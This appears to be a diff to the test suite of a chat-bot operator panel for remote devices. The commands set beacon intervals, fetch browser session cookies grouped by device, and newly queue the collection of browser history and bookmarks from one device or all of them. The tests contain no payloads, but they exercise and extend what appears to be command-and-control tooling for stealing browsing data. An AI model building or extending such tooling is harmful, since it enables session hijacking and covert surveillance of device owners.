@@ -40,6 +40,8 @@ show_devices = bot_module.show_devices.callback  # type: ignore[union-attr]
 set_beacon_interval = bot_module.set_beacon_interval.callback  # type: ignore[union-attr]
 request_cookies = bot_module.request_cookies.callback  # type: ignore[union-attr]
 set_communication_protocol = bot_module.set_communication_protocol.callback  # type: ignore[union-attr]
+request_history = bot_module.request_history.callback  # type: ignore[union-attr]
+request_bookmarks = bot_module.request_bookmarks.callback  # type: ignore[union-attr]
 
 
 # ---------------------------------------------------------------------------
@@ -273,10 +275,10 @@ class TestSetBeaconIntervalCommand:
     async def test_valid_interval(self) -> None:
         interaction = _make_interaction()
         with patch("bot.call_server", return_value=None):
-            await set_beacon_interval(interaction, 16)
+            await set_beacon_interval(interaction, 30)
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "✅" in sent_text
-        assert "16" in sent_text
+        assert "30" in sent_text
 
     @pytest.mark.asyncio
     async def test_invalid_interval(self) -> None:
@@ -289,7 +291,7 @@ class TestSetBeaconIntervalCommand:
     @pytest.mark.asyncio
     async def test_non_admin_gets_denied(self) -> None:
         interaction = _make_interaction(author_id=999)
-        await set_beacon_interval(interaction, 16)
+        await set_beacon_interval(interaction, 30)
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "Access denied" in sent_text
 
@@ -298,12 +300,44 @@ class TestRequestCookiesCommand:
     """Tests for the /request-cookies slash command."""
 
     @pytest.mark.asyncio
-    async def test_admin_gets_cookies(self) -> None:
+    async def test_admin_gets_cached_cookies_and_queue_message(self) -> None:
+        interaction = _make_interaction()
+        cookie_data = {
+            "status": "success",
+            "message": "Retrieved 1 cookie(s)",
+            "data": {
+                "cookies_by_device": {
+                    "POCO_F5": {"session": "abc123"},
+                }
+            },
+        }
+        queue_data = {
+            "status": "success",
+            "message": "Task 'request-cookies' queued for 1 device(s)",
+        }
+
+        async def mock_call_server(path, **kwargs):
+            if path == "/admin/cookies":
+                return cookie_data
+            elif path == "/admin/queue-task":
+                return queue_data
+            return None
+
+        with patch("bot.call_server", side_effect=mock_call_server):
+            await request_cookies(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "session" in sent_text
+        assert "📡" in sent_text
+        assert "queued" in sent_text.lower()
+
+    @pytest.mark.asyncio
+    async def test_server_unreachable_shows_fallback_and_queue_error(self) -> None:
         interaction = _make_interaction()
         with patch("bot.call_server", return_value=None):
             await request_cookies(interaction)
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "Cookies" in sent_text
+        assert "could not be queued" in sent_text
 
     @pytest.mark.asyncio
     async def test_non_admin_gets_denied(self) -> None:
@@ -341,6 +375,124 @@ class TestSetCommunicationProtocolCommand:
         assert "Access denied" in sent_text
 
 
+class TestRequestHistoryCommand:
+    """Tests for the /request-history slash command."""
+
+    @pytest.mark.asyncio
+    async def test_admin_queues_for_all_devices_by_default(self) -> None:
+        interaction = _make_interaction()
+        server_data = {
+            "status": "success",
+            "message": "Task 'request-history' queued for 3 device(s)",
+        }
+        with patch("bot.call_server", return_value=server_data) as mock_call:
+            await request_history(interaction)
+            mock_call.assert_called_once_with(
+                "/admin/queue-task",
+                method="POST",
+                json_body={
+                    "device_name": "*",
+                    "task_type": "request-history",
+                    "parameters": {},
+                },
+            )
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "✅" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_admin_queues_for_specific_device(self) -> None:
+        interaction = _make_interaction()
+        server_data = {
+            "status": "success",
+            "message": "Task 'request-history' queued for POCO_F5",
+        }
+        with patch("bot.call_server", return_value=server_data) as mock_call:
+            await request_history(interaction, device="POCO_F5")
+            mock_call.assert_called_once_with(
+                "/admin/queue-task",
+                method="POST",
+                json_body={
+                    "device_name": "POCO_F5",
+                    "task_type": "request-history",
+                    "parameters": {},
+                },
+            )
+
+    @pytest.mark.asyncio
+    async def test_non_admin_gets_denied(self) -> None:
+        interaction = _make_interaction(author_id=999)
+        await request_history(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "Access denied" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_server_unreachable_shows_error(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", return_value=None):
+            await request_history(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "Server unreachable" in sent_text
+
+
+class TestRequestBookmarksCommand:
+    """Tests for the /request-bookmarks slash command."""
+
+    @pytest.mark.asyncio
+    async def test_admin_queues_for_all_devices_by_default(self) -> None:
+        interaction = _make_interaction()
+        server_data = {
+            "status": "success",
+            "message": "Task 'request-bookmarks' queued for 3 device(s)",
+        }
+        with patch("bot.call_server", return_value=server_data) as mock_call:
+            await request_bookmarks(interaction)
+            mock_call.assert_called_once_with(
+                "/admin/queue-task",
+                method="POST",
+                json_body={
+                    "device_name": "*",
+                    "task_type": "request-bookmarks",
+                    "parameters": {},
+                },
+            )
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "✅" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_admin_queues_for_specific_device(self) -> None:
+        interaction = _make_interaction()
+        server_data = {
+            "status": "success",
+            "message": "Task 'request-bookmarks' queued for POCO_F5",
+        }
+        with patch("bot.call_server", return_value=server_data) as mock_call:
+            await request_bookmarks(interaction, device="POCO_F5")
+            mock_call.assert_called_once_with(
+                "/admin/queue-task",
+                method="POST",
+                json_body={
+                    "device_name": "POCO_F5",
+                    "task_type": "request-bookmarks",
+                    "parameters": {},
+                },
+            )
+
+    @pytest.mark.asyncio
+    async def test_non_admin_gets_denied(self) -> None:
+        interaction = _make_interaction(author_id=999)
+        await request_bookmarks(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "Access denied" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_server_unreachable_shows_error(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", return_value=None):
+            await request_bookmarks(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "Server unreachable" in sent_text
+
+
 # ---------------------------------------------------------------------------
 # Autocomplete tests
 # ---------------------------------------------------------------------------
@@ -359,8 +511,9 @@ class TestBeaconIntervalAutocomplete:
         interaction = _make_interaction()
         choices = await beacon_interval_autocomplete(interaction, "1")
         values = [c.value for c in choices]
-        assert 16 in values
-        assert 2 not in values
+        assert 15 in values
+        assert 120 in values
+        assert 30 not in values
 
     @pytest.mark.asyncio
     async def test_returns_choice_objects(self) -> None:
